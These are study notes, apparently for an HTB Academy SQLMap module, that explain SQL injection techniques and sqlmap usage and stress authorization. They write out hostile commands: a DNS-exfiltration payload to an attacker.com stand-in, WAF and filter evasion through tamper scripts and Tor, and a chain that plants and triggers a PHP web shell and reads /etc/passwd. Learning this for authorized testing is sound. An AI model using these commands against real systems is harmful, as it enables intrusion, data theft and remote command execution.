---
tags: [htb-academy, web-pentest, sqlmap, sql-injection, revision]
module: SQLMap Essentials
---

# SQLMap Essentials: Revision Notes

> **Legend:** Unmarked = from your module text. **(Extra)** = my own added explanation or example. **⚠ Verify** = unclear or inconsistent in the source.
> **Authorization:** Only run SQLMap (especially `--file-read`, `--file-write`, `--os-shell`, OS command execution, and WAF-bypass tamper scripts) against systems you are explicitly authorized to test.
> **Assessment note:** No flags or assessment answers are included. Section 7 gives approach only.

---

## 1. Main Concepts: What, Why, How

### 1.1 What SQLMap Is

- **What:** A free, open-source, Python-based penetration testing tool that automates detection and exploitation of SQL injection (SQLi) flaws. Continuously developed since 2006.
- **Why it matters:** Automates the detection engine, fingerprinting, enumeration, optimization, WAF/IDS bypass (via "tamper" scripts), database content retrieval, file system access, and OS command execution — covering the full SQLi exploitation lifecycle in one tool.
- **Installation:**
  - Pre-installed on Pwnbox and most security-focused distros.
  - Debian: `sudo apt install sqlmap`
  - Manual: `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev`
  - Run with: `python sqlmap.py`
- **DBMS support:** The broadest of any SQLi tool — MySQL, Oracle, PostgreSQL, MSSQL, SQLite, IBM DB2, MS Access, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, and many more (CockroachDB, TiDB, Amazon Redshift, etc.), continuously expanded by the SQLMap team.

### 1.2 SQL Injection Techniques SQLMap Supports (BEUSTQ)

> Shown via `sqlmap -hh` under `--technique=TECH` (default: all, `BEUSTQ`).

| Letter | Technique | Core idea |
|---|---|---|
| **B** | Boolean-based blind | Differentiate TRUE vs FALSE responses |
| **E** | Error-based | Force a DBMS error that carries query output in its message |
| **U** | UNION query-based | Append a `UNION SELECT` to pull extra data into the visible response |
| **S** | Stacked queries | Inject a second, separate statement (`; DROP TABLE ...`) |
| **T** | Time-based blind | Use response delay (e.g. `SLEEP()`) to infer TRUE/FALSE |
| **Q** | Inline queries | Embed a subquery inside the original query's structure |

**Deeper notes per technique:**

- **Boolean-based blind** (`AND 1=1`): Yields **1 bit of information per request**; extracting one character typically needs **~7–8 requests** depending on charset/response stability. TRUE results look like (or near-identical to) the normal response; FALSE results differ substantially. Considered the **most common** SQLi type found in the wild.
- **Error-based** (`AND GTID_SUBSET(@@version,0)`): Exploits DBMS error messages being reflected in the response. SQLMap has the most comprehensive error-based payload library, covering MySQL, PostgreSQL, Oracle, MSSQL, Sybase, Vertica, IBM DB2, Firebird, MonetDB. Retrieves data in ~200-byte "chunks" per request — **faster than all types except UNION-based**.
- **UNION query-based** (`UNION ALL SELECT 1,@@version,3`): Extends the original query so injected results are rendered directly in the page response. **Fastest type overall** — in the ideal case, an entire table can be pulled in a single request.
- **Stacked queries** (`; DROP TABLE users`), aka "piggy-backing": Injecting an additional, separate SQL statement. Required for non-query statements (`INSERT`/`UPDATE`/`DELETE`). Must be **supported by the target platform** (MSSQL and PostgreSQL support it by default; **not supported in MySQL** — this distinction matters for OS-level exploitation, see §6). SQLMap can use stacking for advanced features like OS command execution.
- **Time-based blind** (`AND 1=IF(2>1,SLEEP(5),0)`): Same logic as boolean-based, but TRUE/FALSE is read from response **timing** instead of content. TRUE causes a noticeable delay; FALSE responds normally. **Considerably slower** than boolean-based since you must wait out the delay on every TRUE result. Used when boolean-based doesn't apply — e.g. the vulnerable statement is a non-query (INSERT/UPDATE/DELETE) with no effect on page rendering, so there's nothing for boolean-based comparison to key off of.
- **Inline queries** (`SELECT (SELECT @@version) from`): A query embedded inside the original query's structure. **Uncommon** — requires the vulnerable app to be written in a specific way — but SQLMap supports it.
- **Out-of-band SQLi** (`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`): Not part of the `BEUSTQ` set — a separate, more advanced category used when other types are unsupported or too slow. SQLMap implements this via **DNS exfiltration**: by controlling a domain's DNS server, SQLMap forces the target to request attacker-controlled subdomains encoding the query result (e.g. `foo.attacker.com`), then reconstructs the data from the logged DNS requests.

---

## 2. Important Terminology

| Term | Short definition |
|---|---|
| Vector | The core payload carrying the actual SQL code to execute (e.g. `UNION ALL SELECT 1,2,VERSION()`) |
| Boundary | The prefix/suffix wrapping used to properly close/reopen the vulnerable SQL statement around the vector |
| Heuristic test | A quick preliminary check (not proof) suggesting a parameter *might* be injectable |
| Dynamic parameter | A parameter whose value change produces a response change — a prerequisite sign it may be DB-linked |
| Stable target | A target whose repeated identical requests return consistent responses, needed for reliable TRUE/FALSE comparison |
| Reflective value | Part of the injected payload echoed back in the response — must be filtered out to avoid noise |
| Level (`--level`) | 1–5, extends the *set of boundaries and vectors* tried, based on expected success likelihood |
| Risk (`--risk`) | 1–3, extends the vector set based on potential for harm (data loss/DoS) — e.g. OR-based payloads |
| Tamper script | A Python script that modifies a payload just before sending, typically to bypass a WAF/filter |
| Anti-CSRF token | A per-request unique token used to prevent forged requests, which incidentally also hinders automated tools |
| UDF | User-Defined Function — custom SQL function (e.g. `sys_exec`) SQLMap can inject to get OS command execution |
| `secure_file_priv` | MySQL variable restricting where file read/write via SQL is permitted |
| DBA | Database Administrator — the privileged role within the DBMS (distinct from OS-level "root") |
| File stager / backdoor (SQLMap `--os-shell`) | Temporary uploaded PHP files SQLMap uses as a staging mechanism to get an interactive OS shell |

---

## 3. Commands and Tool Reference

### 3.1 Getting Started

```bash
sqlmap -h     # basic help listing
sqlmap -hh    # advanced/full help listing (shows --technique, all switches, etc.)
```
- **Tip:** The project wiki is the official manual for anything not covered by `-hh`.

**Basic scan:**
```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```
- **Flags:**
  - `-u`/`--url`: target URL with a parameter to test.
  - `--batch`: skip all interactive prompts, auto-select the default answer each time.
- **How it works (phase order, per the module's example run):** test connection → test URL stability → test if parameter is dynamic → heuristic (basic) injectability check + possible DBMS guess → heuristic XSS check → confirm/narrow DBMS → (optionally) extend level/risk for that DBMS → test each injection technique in turn (boolean, error, union, stacked, time-based) → report found injection point(s) with type, title, and exact payload → report back-end DBMS and web app technology.
- **Expected result:** A summary block listing each successful injection type (e.g. boolean-based blind, error-based, time-based blind, UNION query) with its exact payload, plus the identified back-end DBMS and web stack.

### 3.2 Reading SQLMap's Log Output

| Log message (example) | Meaning |
|---|---|
| `target URL content is stable` | No major response differences across identical repeat requests — needed for reliable TRUE/FALSE comparison |
| `GET parameter 'id' appears to be dynamic` | Changing the value changes the response — a sign the parameter is DB-linked |
| `heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')` | An intentionally malformed value triggered a DBMS error — **not proof**, just a strong hint to investigate further |
| `heuristic (XSS) test shows ... might be vulnerable to XSS` | A secondary, non-primary heuristic check SQLMap runs opportunistically |
| `it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes?` | Lets SQLMap narrow its payload set to the detected DBMS, speeding up the scan |
| `do you want to include all tests ... extending provided level (1) and risk (1) values?` | Offers to broaden the payload/boundary set specifically for the now-known DBMS |
| `reflective value(s) found and filtering out` | Part of the payload is echoed in the response; SQLMap filters this noise automatically before comparing |
| `GET parameter 'id' appears to be '...' injectable (with --string="luther")` | Still provisional (esp. for boolean/time-based types, prone to false positives) — SQLMap runs extra logic checks at the end to weed these out. The `--string` note means a **constant string** was found reliably distinguishing TRUE from FALSE, which is a strong, low-false-positive signal that skips the need for fuzzy/dynamic comparison |
| `time-based comparison requires larger statistical model, please wait...` | SQLMap needs a baseline sample of normal response times before it can statistically detect a deliberate delay, even over high-latency links |
| `automatically extending ranges for UNION query injection technique tests...` | UNION tests are normally capped at ~10 requests to save time, but get extended automatically once another technique is already confirmed likely |
| `'ORDER BY' technique appears to be usable...` | A fast heuristic for finding the right UNION column count via binary search, used before full UNION payloads are tried; depends on the specific vulnerable query/table |
| `GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)?` | Confirms exploitability; choose to keep scanning other parameters if doing a thorough/reporting-focused assessment |
| `sqlmap identified the following injection point(s) with a total of N HTTP(s) requests:` | Final confirmed, exploitable findings — SQLMap only lists **provably usable** vulnerabilities here |
| `fetched data logged to text files under '...'` | Local session/output directory for this target; future runs reuse this session data to minimize repeat requests |

### 3.3 Setting Up the Request

**From a browser — Copy as cURL:**
- Capture the request in DevTools (Network tab) → right-click → "Copy as cURL" → paste, then just swap `curl` for `sqlmap` at the start of the command. All headers/cookies carry over automatically.

**GET parameters (via URL):**
```bash
sqlmap -u "http://www.example.com/?id=1"
```

**POST data:**
```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```
- By default, **all** POST parameters are tested. Narrow to one known-vulnerable parameter with `-p uid`, or explicitly mark the injection point in the data itself with an asterisk:
```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

**Full HTTP request from a file (complex headers/body):**
```bash
sqlmap -r req.txt
```
- `req.txt` can be captured from Burp (right-click → "Copy to file") or from a browser's "Copy Request Headers."
- Same asterisk convention works inside the file to mark the exact injection point (e.g. `/?id=*`).

**Custom headers/cookies:**
```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'   # equivalent
```
- Same pattern applies to `--host`, `--referer`, `-A`/`--user-agent`.

**Avoiding the default SQLMap User-Agent (often blocklisted):**
```bash
--random-agent   # picks a random real-browser UA from a built-in pool
--mobile         # imitates a smartphone UA
```

**Injecting into a header instead of a parameter:**
```bash
--cookie="id=1*"
```
- The asterisk marker works in any part of the request, not just GET/POST params.

**Non-standard HTTP method:**
```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

**JSON / XML request bodies:**
- Supported with a "relaxed" parser (no strict format constraints).
- Short/simple bodies: use `--data` directly.
- Long/complex bodies: use `-r req.txt` with the full raw request (including a JSON or XML body) — SQLMap detects and asks whether to process it as JSON/XML.

### 3.4 Troubleshooting / Error Handling

| Option | Purpose |
|---|---|
| `--parse-errors` | Parses and prints DBMS error messages found in responses — helps diagnose why detection may be failing |
| `-t FILE` | Logs the **entire** HTTP traffic (every request + response) to a file for manual review |
| `-v 6` | Maximum verbosity — prints debug info and full raw HTTP traffic to the terminal in real time |
| `--proxy=http://127.0.0.1:8080` | Routes all SQLMap traffic through a MITM proxy (e.g. Burp) for manual inspection, repeating, and use of Burp's other tooling |

**Examples:**
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
cat /tmp/traffic.txt   # review full request/response pairs
```
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

### 3.5 Attack Tuning

**Prefix/Suffix (manual boundary control):**
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
- Needed in rare cases the default boundary set doesn't cover — wraps every tested vector between a fixed prefix and suffix to keep the final SQL syntactically valid.
- **Worked example:** for `... WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1"`, the vector `UNION ALL SELECT 1,2,VERSION()` with prefix `%'))` and suffix `-- -` produces a syntactically correct final query.

**Level and Risk:**

| Option | Range (default) | Effect |
|---|---|---|
| `--level` | 1–5 (1) | Expands the **set of vectors and boundaries** tried, weighted by their likelihood of success — higher level = lower-probability options also get tried |
| `--risk` | 1–3 (1) | Expands the vector set by **potential for harm** (e.g. data loss, DoS) — OR-based payloads are a common example requiring a risk bump |

- **View exact payloads being tried:** combine with `-v 3` (or higher) to print each `[PAYLOAD]` line.
- **Payload volume scaling (per source numbers):** default (`--level=1 --risk=1`) tests up to **72 payloads** per parameter; maximum (`--level=5 --risk=3`) scales up to **7,865 payloads**.
- **Guidance:** Don't touch these by default — it slows detection significantly. Raise `--risk` specifically when OR-based payloads are necessary (e.g. login pages), since OR payloads carry inherent risk if the underlying query is a data-modifying statement (DELETE/UPDATE) rather than a pure SELECT.

**Fine-tuning response-difference detection:**

| Option | When to use |
|---|---|
| `--code=200` | TRUE/FALSE difference shows up as a specific HTTP status code |
| `--titles` | Difference is visible in the `<title>` tag content |
| `--string=success` | A specific string appears only in TRUE responses |
| `--text-only` | Strip all HTML tags, compare only visible text (useful against noisy/hidden dynamic content) |

**Narrowing to specific techniques:**
```bash
--technique=BEU   # only boolean-based blind, error-based, and UNION query — skip time-based/stacked
```
- Useful when time-based payloads are causing timeouts/trouble, or you want to force a specific technique.

**UNION-specific tuning:**

| Option | Purpose |
|---|---|
| `--union-cols=17` | Manually specify the known column count (skips auto-detection) |
| `--union-char='a'` | Override the default NULL/random-integer filler values when they're incompatible with the query's expected types |
| `--union-from=users` | Supply a `FROM <table>` appendix some DBMS (e.g. Oracle) require at the end of a UNION query, needed especially when the DBMS couldn't be auto-detected before this point |

### 3.6 Database Enumeration

**Basic info gathering:**
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
- `--banner`: DB version string (uses `VERSION()` internally for MySQL).
- `--current-user`: current DB user (`CURRENT_USER()`).
- `--current-db`: current database name (`DATABASE()`).
- `--is-dba`: whether the current user has DBA (admin) rights.
- **Note (source):** SQLMap resumes from the stored session for a previously-detected target rather than re-running detection.
- **⚠ Important distinction (source):** a DB "root" user has **no inherent relation** to the OS "root" user — it's a privileged role *within the DBMS* only. Don't conflate database privilege with system privilege.

**Table enumeration:**
```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

**Dump a specific table:**
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
- Output defaults to CSV, saved under `~/.local/share/sqlmap/output/<target>/dump/<db>/<table>.csv`.
- Alternative formats: `--dump-format=HTML` or `--dump-format=SQLITE` (lets you load the dump into a local SQLite environment for further investigation).

**Narrow to specific columns:**
```bash
sqlmap -u "..." --dump -T users -D testdb -C name,surname
```

**Narrow to a row range:**
```bash
sqlmap -u "..." --dump -T users -D testdb --start=2 --stop=3
```

**Conditional filtering (WHERE clause):**
```bash
sqlmap -u "..." --dump -T users -D testdb --where="name LIKE 'f%'"
```

**Full database / full server dump:**
```bash
--dump -D testdb              # all tables in one database (omit -T)
--dump-all                    # every database on the server
--dump-all --exclude-sysdbs   # same, but skip system DBs (usually low pentest value)
```

### 3.7 Advanced Database Enumeration

**Full schema overview (all tables/columns across all DBs):**
```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

**Search for identifiers by keyword (uses SQL `LIKE`):**
```bash
sqlmap -u "..." --search -T user      # search table names
sqlmap -u "..." --search -C pass      # search column names
```
- Useful when facing large, unfamiliar schemas — quickly surfaces likely-interesting tables/columns (e.g. anything matching `user` or `pass`) across every database on the server.
- After a table-name search, SQLMap will prompt to dump matched tables directly.

**Password enumeration + automatic cracking:**
```bash
sqlmap -u "..." --dump -D master -T users
```
- When SQLMap recognizes a column's values as **known hash formats**, it offers to:
  1. Save hashes to a file for use with other tools.
  2. Run a **dictionary-based cracking attack** directly.
- **Cracking details (per source):** multi-process (parallelized by CPU core count), supports **31 hash algorithm types**, uses a bundled **~1.4 million-entry** dictionary compiled from common/leaked passwords. Optionally test common password suffixes (slower).

**DB-level (system) credential enumeration:**
```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```
- Targets system tables holding DB connection credentials (not app-level user tables) — same hash-cracking workflow applies.

**"Enumerate everything" (use with caution):**
```bash
--all --batch
```
- Attempts to retrieve everything accessible from the target in one run. **Can take a very long time** — output must be reviewed manually afterward in the saved files.

### 3.8 Bypassing Web Application Protections

**Anti-CSRF token handling:**
```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
- SQLMap parses each response for a fresh token value and reuses it on the next request.
- If a parameter name contains `csrf`, `xsrf`, or `token` (common infixes) even without `--csrf-token` explicitly set, SQLMap will **prompt** to auto-update it going forward.

**Unique-value parameter bypass (no response parsing needed):**
```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5
```
- Randomizes the named parameter's value on every request — defeats simple "must be unique per request" anti-automation checks.

**Calculated/derived parameter bypass (e.g. a hash of another field):**
```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5
```
- `--eval` runs **arbitrary Python** right before each request is sent, letting you compute a dependent parameter value (e.g. keep an MD5 digest of `id` in sync with `id` itself as SQLMap mutates it).

**IP concealment:**

| Option | Purpose |
|---|---|
| `--proxy="socks4://177.39.187.70:33283"` | Route traffic through a single proxy |
| `--proxy-file` | Rotate through a list of proxies, auto-skipping ones that fail/get blocklisted |
| `--tor` | Auto-detect and use a local Tor SOCKS4 proxy (commonly port 9050/9150) |
| `--check-tor` | Verify Tor is actually in effect by checking `https://check.torproject.org/` for the expected "Congratulations" response |

**WAF detection and bypass:**
- SQLMap automatically probes for a WAF early on using a deliberately malicious-looking payload on a **non-existent** parameter name (e.g. `?pfov=...`). A substantial response change (e.g. ModSecurity's `406 Not Acceptable`) signals a WAF is present.
- On positive detection, SQLMap uses the third-party **identYwaf** library (signatures for 80 different WAF products) to identify which one.
- `--skip-waf`: skip this heuristic check entirely (reduces noise/requests).

**User-Agent blocklisting bypass:**
- SQLMap's default UA (`sqlmap/1.4.9 (http://sqlmap.org)`) is a common target for naive blocklists. Use `--random-agent` to rotate through real browser UAs.

**Tamper scripts (payload mutation to dodge filters/WAFs):**
```bash
--tamper=between,randomcase
```
- Python scripts that rewrite the payload just before sending, chained in a defined priority order (some modify SQL syntax, others don't care about content — e.g. `appendnullbyte`).
- `--list-tampers`: print the full list with descriptions.
- Custom tamper scripts can also be written (e.g. for second-order SQLi scenarios).

| Tamper script | What it does |
|---|---|
| `0eunion` | `UNION` → `e0UNION` |
| `base64encode` | Base64-encodes the whole payload |
| `between` | `>` → `NOT BETWEEN 0 AND #`, `=` → `BETWEEN # AND #` |
| `commalesslimit` | MySQL `LIMIT M, N` → `LIMIT N OFFSET M` |
| `equaltolike` | `=` → `LIKE` |
| `halfversionedmorekeywords` | Adds MySQL versioned comment before each keyword |
| `modsecurityversioned` | Wraps the full query in a MySQL versioned comment |
| `modsecurityzeroversioned` | Wraps the full query in a MySQL zero-versioned comment |
| `percentage` | Prefixes each character with `%` (e.g. `SELECT` → `%S%E%L%E%C%T`) |
| `plus2concat` | `+` → MSSQL `CONCAT()` |
| `randomcase` | Randomizes keyword casing (`SELECT` → `SEleCt`) |
| `space2comment` | Space → `/**/`-style comment |
| `space2dash` | Space → `--` + random string + newline |
| `space2hash` | Space → MySQL `#` + random string + newline |
| `space2mssqlblank` | Space → an alternate valid MSSQL blank character |
| `space2plus` | Space → `+` |
| `space2randomblank` | Space → a random valid alternate blank character |
| `symboliclogical` | `AND`/`OR` → `&&`/`||` |
| `versionedkeywords` | Wraps each non-function keyword in a MySQL versioned comment |
| `versionedmorekeywords` | Wraps **every** keyword in a MySQL versioned comment |

**Chunked transfer encoding bypass:**
```bash
--chunked
```
- Splits the POST body into HTTP chunks, breaking up blocklisted SQL keywords across chunk boundaries so filters miss them.

**HTTP Parameter Pollution (HPP) bypass:**
- Splits a payload across multiple same-named parameters (e.g. `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users`), relying on a backend platform (e.g. classic ASP) that concatenates repeated parameter values.

---

## 4. OS-Level Exploitation via SQLMap

### 4.1 Checking Privileges First

```bash
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```
- `current user is DBA: False` → file read will likely fail (`[ERROR] no data retrieved`).
- `current user is DBA: True` → file read/write is much more likely to succeed.
- **Underlying MySQL requirement for file reads:** the DB user needs `LOAD DATA` and `INSERT` privileges, conceptually equivalent to:
```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
```

### 4.2 Reading Local Files

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```
- **How it works:** SQLMap handles the underlying `LOAD_FILE()`-style mechanics itself (no need to write the raw SQL by hand), then downloads and saves the retrieved file locally.
- **Expected result:** A confirmation prompt, then the file saved under `~/.sqlmap/output/<target>/files/_etc_passwd` (path-flattened filename). `cat` the local copy to review it.
- **⚠ Troubleshooting tip from source:** if retrieval has problems, try `--no-cast` or `--hex`; SQLMap may also automatically fall back from one retrieval technique to a simpler UNION-based approach mid-run.

### 4.3 Writing Local Files

- **Requirements (modern DBMS, by design, much more restricted than reads):**
  - File-write is **disabled by default**.
  - For MySQL specifically: `secure_file_priv` must be manually disabled/configured to permit `INTO OUTFILE`.
  - The OS user running the DBMS needs actual write access to the target directory.

**Prepare a PHP web shell locally:**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Write it to the remote server:**
```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
- `--file-write`: local source file. `--file-dest`: full remote destination path.
- Confirms success by comparing local/remote file sizes.

**Trigger the shell:**
```bash
curl "http://www.example.com/shell.php?cmd=ls+-la"
```
- **Result:** confirms both successful file write **and** remote command execution via the uploaded shell.

### 4.4 Getting an Interactive OS Shell (`--os-shell`)

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
- **What SQLMap tries, per source:** writing a remote shell file (as above), injecting SQL functions/UDFs that execute commands and return output, or using DBMS-native command-execution features (e.g. MSSQL's `xp_cmdshell`).
- **First attempt (default technique, source's example):** fell back to UNION-based retrieval and returned `No output` — the default technique isn't always the one that successfully surfaces command output.
- **Fix: force a technique more likely to carry output directly, e.g. Error-based:**
```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```
- **Interactive setup prompts (source's walkthrough):**
  1. Which web application language? (e.g. PHP)
  2. Try to provoke full path disclosure for the web root? (yes)
  3. Which writable directory to try? (common locations list, custom path(s), custom file list, or brute-force search)
- SQLMap then uploads a **file stager** and a **backdoor** file, and drops you into an interactive `os-shell>` prompt.
- **Note:** All of these setup prompts are the defaults that `--batch` would auto-select — adding `--batch` to the command skips them entirely.
- **Underlying mechanism for MySQL specifically (per source's UDF-based attempt):** SQLMap can upload a compiled UDF binary (`.so`) and create SQL functions like `sys_exec`/`sys_eval` from it to get command execution directly through SQL function calls — this is a different path from the file-stager/backdoor approach and was the one shown failing to produce output in the source's first attempt.

---

## 5. Practical Workflow

1. **Confirm authorization and scope.**
2. **Capture the target request** — via a browser's "Copy as cURL," Burp's "Copy to file," or manually noting the URL/POST data.
3. **Run an initial detection scan:**
```bash
sqlmap -u "<target>" --batch
```
   or with `-r req.txt` / `--data` as appropriate for the request shape. Mark the specific injection point with `*` if there are multiple parameters and only one is suspected vulnerable.
4. **Read the log output carefully** — dynamic parameter? heuristic hit? which DBMS guessed? which technique(s) confirmed?
5. **If detection stalls or errors out:** add `--parse-errors`, `-t traffic.txt`, `-v 6`, or route through `--proxy` for manual inspection; check for anti-CSRF tokens, unique/calculated parameters, or a WAF (SQLMap's own heuristic, or try `--tamper` scripts / `--random-agent` / `--tor`).
6. **If detection still fails at default settings**, raise `--level` and/or `--risk` to broaden the payload/boundary set — but be mindful of the time cost and `--risk`'s potential for harm.
7. **Once an injection point is confirmed**, start enumeration: `--banner --current-user --current-db --is-dba` for orientation, then `--tables -D <db>`, `--schema`, or `--search` to map out what's available.
8. **Dump data of interest:** `--dump -T <table> -D <db>`, narrowing with `-C`, `--start`/`--stop`, or `--where` as needed. Let SQLMap offer to crack any recognized password hashes.
9. **If privilege-escalation / RCE is in scope and authorized:** check `--is-dba`, then attempt `--file-read`, `--file-write` (+ a web shell), or `--os-shell` (trying multiple `--technique` values if the default produces no output).
10. **Document findings:** confirmed injection point(s), technique(s), exact payload(s), DBMS/version, data retrieved, and (if applicable) OS-level impact achieved.

### Common Mistakes
- Forgetting `--batch`, then getting stuck on interactive prompts during unattended/scripted runs.
- Not marking the correct injection point with `*` when multiple parameters exist, causing SQLMap to waste time testing irrelevant ones.
- Cranking `--level`/`--risk` to max by default instead of only when genuinely needed — wastes huge amounts of time and increases risk of harmful OR-based payloads hitting data-modifying statements.
- Treating a "parameter might be injectable" heuristic message as confirmed — it explicitly is not proof.
- Assuming DB "root"/DBA privilege implies OS "root" privilege — they are unrelated privilege domains.
- Trying file read/write without first checking `--is-dba`.
- Giving up on `--os-shell` after the default technique returns no output, instead of trying `--technique=E` (or others).
- Ignoring stacked-queries' platform dependency (works by default on MSSQL/PostgreSQL, not MySQL) when planning an attack that assumes stacked-query support.
- Running `--dump-all` or `--all` without `--exclude-sysdbs`/awareness that it can take a very long time and produce a huge amount of output to sift through.

### Troubleshooting
- **Detection fails / inconsistent results:** check target stability (`target URL content is stable` message), consider `-v 6` for full traffic visibility, or `--parse-errors` to surface DBMS error text directly.
- **Suspect a WAF is interfering:** let SQLMap's built-in WAF heuristic run (don't use `--skip-waf` prematurely), try `--random-agent`, and experiment with `--tamper` scripts.
- **Anti-CSRF / unique / calculated parameter blocking automation:** use `--csrf-token`, `--randomize`, or `--eval` respectively.
- **File read fails with `no data retrieved`:** confirm DBA privilege first; without it, file read is unlikely to work.
- **`--os-shell` returns `No output` on the default technique:** explicitly force a different technique, e.g. `--technique=E`.
- **Need to conceal source IP / got blocklisted mid-scan:** `--proxy`, `--proxy-file`, or `--tor` (verify with `--check-tor`).

---

## 6. Quick Revision Sheet

### 6.1 Top 10 Things to Remember
1. SQLMap supports six core injection techniques via `--technique=BEUSTQ`: Boolean-blind, Error-based, UNION, Stacked queries, Time-blind, inline Queries — plus a separate, more advanced Out-of-band (DNS exfiltration) mode.
2. Stacked queries require platform support — default-enabled on MSSQL/PostgreSQL, **not** MySQL.
3. UNION-based is the fastest technique overall (can pull a whole table in one request); error-based is fast but chunked (~200 bytes/request); boolean-blind is the most common type found but needs ~7–8 requests per character.
4. A "parameter might be injectable" heuristic message is **not proof** — SQLMap confirms with further testing before listing it as a true injection point.
5. `--level` (1–5) widens the boundary/vector set tried; `--risk` (1–3) widens it toward riskier (e.g. OR-based) payloads — default run tests up to 72 payloads/parameter, max settings up to 7,865.
6. Use `*` in `--data`/request files to mark the exact parameter to inject, or `-p` to restrict testing to a known parameter.
7. Enumeration flow: `--banner --current-user --current-db --is-dba` → `--tables -D <db>` (or `--schema`/`--search`) → `--dump -T <table> -D <db>` (narrow with `-C`/`--start`/`--stop`/`--where`).
8. DB "root"/DBA privilege is unrelated to OS "root" — don't conflate them.
9. File read needs `LOAD DATA`+`INSERT`-equivalent privilege; file write needs `secure_file_priv` permissive + OS-level write access — both far more available with DBA rights.
10. Protection bypasses: `--csrf-token`, `--randomize`, `--eval` (anti-automation parameter tricks); `--tamper`, `--random-agent`, `--chunked`, HPP (filter/WAF evasion); `--proxy`/`--tor` (IP concealment).

### 6.2 Compact Command Reference

| Task | Command |
|---|---|
| Basic scan | `sqlmap -u "URL" --batch` |
| POST data scan | `sqlmap -u "URL" --data "a=1&b=2"` |
| Full request file | `sqlmap -r req.txt` |
| Random User-Agent | `--random-agent` |
| Verbose debug output | `-v 6` |
| Log full traffic | `-t traffic.txt` |
| Parse DBMS errors | `--parse-errors` |
| Via proxy (e.g. Burp) | `--proxy=http://127.0.0.1:8080` |
| Widen vector/boundary set | `--level=5 --risk=3` |
| Restrict technique(s) | `--technique=BEU` |
| Basic DB info | `--banner --current-user --current-db --is-dba` |
| List tables | `--tables -D <db>` |
| Full schema | `--schema` |
| Search identifiers | `--search -T <keyword>` / `--search -C <keyword>` |
| Dump a table | `--dump -T <table> -D <db>` |
| Dump specific columns | `-C col1,col2` |
| Row range | `--start=N --stop=M` |
| Conditional dump | `--where="col LIKE 'x%'"` |
| Dump whole DB / all DBs | `--dump -D <db>` / `--dump-all --exclude-sysdbs` |
| DB-level credentials | `--passwords` |
| Enumerate everything | `--all --batch` |
| Read a file | `--file-read "/etc/passwd"` |
| Write a file | `--file-write "local" --file-dest "/remote/path"` |
| Interactive OS shell | `--os-shell` (add `--technique=E` if default gives no output) |
| Anti-CSRF handling | `--csrf-token="name"` |
| Randomize a parameter | `--randomize=<param>` |
| Compute a derived parameter | `--eval="python code"` |
| List tamper scripts | `--list-tampers` |
| Chain tamper scripts | `--tamper=between,randomcase` |
| Chunked body bypass | `--chunked` |
| Skip WAF heuristic | `--skip-waf` |

### 6.3 Common Mistakes to Avoid
- Running interactively without `--batch` in automation contexts.
- Not marking the real injection point with `*`/`-p`.
- Defaulting to max `--level`/`--risk` unnecessarily.
- Trusting a "might be injectable" heuristic as confirmed.
- Confusing DB-level root/DBA with OS-level root.
- Skipping `--is-dba` before attempting file read/write.
- Giving up on `--os-shell` without trying other `--technique` values.

### 6.4 Revision Questions

1. **What does each letter in `--technique=BEUSTQ` stand for?**
   B=Boolean-based blind, E=Error-based, U=UNION query-based, S=Stacked queries, T=Time-based blind, Q=Inline queries.
2. **Why is UNION-based SQLi considered the fastest technique?**
   In the ideal case, an attacker can retrieve an entire table's content with a single request, since results are embedded directly in the rendered response.
3. **Why don't stacked queries work by default against MySQL?**
   Stacked query (piggy-backing) support depends on the target platform — it's enabled by default on MSSQL and PostgreSQL, but not MySQL.
4. **What's the difference between `--level` and `--risk`?**
   `--level` (1–5) widens the set of vectors/boundaries tried based on their likelihood of success; `--risk` (1–3) widens the vector set based on potential for harm to the target (e.g. OR-based payloads risking data modification).
5. **Why does SQLMap only list certain findings as confirmed "injection points"?**
   Heuristic matches (especially for boolean/time-based types) are prone to false positives, so SQLMap runs additional logic checks and only reports findings that are provably exploitable.
6. **What MySQL privileges are needed to read local files via SQL injection?**
   `LOAD DATA` and `INSERT` privileges, conceptually equivalent to `LOAD DATA LOCAL INFILE '...' INTO TABLE ...`.
7. **What three things must be true to write files via SQLi against MySQL?**
   File-write isn't disabled by default configuration, `secure_file_priv` permits it, and the OS user running the DBMS has write access to the target directory.
